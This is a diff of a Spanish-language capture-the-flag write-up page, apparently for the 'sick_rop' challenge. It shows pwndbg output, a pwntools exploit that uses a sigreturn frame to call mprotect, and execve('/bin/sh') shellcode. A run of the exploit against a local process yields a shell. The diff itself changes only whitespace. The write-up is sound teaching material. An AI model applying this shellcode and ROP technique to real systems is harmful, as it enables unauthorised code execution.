+<p class="plain-text">Aunque en el binario no existe un gadget <code class="language-plaintext highlighter-rouge">jmp rsp</code> como modificamos el <code class="language-plaintext highlighter-rouge">rsp</code> hacia una parte del binario ahora el inicio de nuestro buffer ahora se guarda en la dirección estática <code class="language-plaintext highlighter-rouge">0x4010b8</code> por lo que podemos apuntar ahí para ejecutar un shellcode.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">Breakpoint 1,</span><span class="az"> 0x000000000040104e</span><span class="p"> in</span><span class="am"> vuln</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> x/i $rip
@@ -404,11 +403,11 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
 </span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
 </span><span class="az">0x4010e0</span><span class="p">:       0x4242424242424242
 </span><span class="ro">pwndbg></span><span class="p"> x/s $rsi
-</span><span class="az">0x4010b8</span><span class="p">:       'A' &ltrepetidos 40 veces>, "BBBBBBBB"  
+</span><span class="az">0x4010b8</span><span class="p">:       'A' &ltrepetidos 40 veces>, "BBBBBBBB"
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El exploit final ejecutará todo el proceso anterior para ejecutar el <code class="language-plaintext highlighter-rouge">mprotect</code> y modificar los permisos del binario a <code class="language-plaintext highlighter-rouge">rwx</code>, entonces enviamos un shellcode al inicio y rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta el return address donde apuntaremos a la dirección <code class="language-plaintext highlighter-rouge">0x4010b8</code> donde sabemos que se guarda el inicio del buffer, al correr el exploit nos devuelve una shell</p>
+<p class="plain-text">El exploit final ejecutará todo el proceso anterior para ejecutar el <code class="language-plaintext highlighter-rouge">mprotect</code> y modificar los permisos del binario a <code class="language-plaintext highlighter-rouge">rwx</code>, entonces enviamos un shellcode al inicio y rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta el return address donde apuntaremos a la dirección <code class="language-plaintext highlighter-rouge">0x4010b8</code> donde sabemos que se guarda el inicio del buffer, al correr el exploit nos devuelve una shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64, SigreturnFrame
@@ -442,7 +441,7 @@ shell.send(payload)
 shell.recv()
 
 </span><span class="c1"># execve("/bin/sh", NULL, NULL);</span><span class="p">
-shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x3b\x58\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x52\x5e\x0f\x05</span><span class="s">"  </span><span class="p">
+shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x3b\x58\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x52\x5e\x0f\x05</span><span class="s">"</span><span class="p">
 
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(shellcode))
 
@@ -459,7 +458,7 @@ shell.interactive()</span>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
-[</span><span class="ve">+</span><span class="p">] Starting local process './sick_rop': pid 170702  
+[</span><span class="ve">+</span><span class="p">] Starting local process './sick_rop': pid 170702
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">id
 uid=1000(user) gid=1000(user) groups=1000(user)
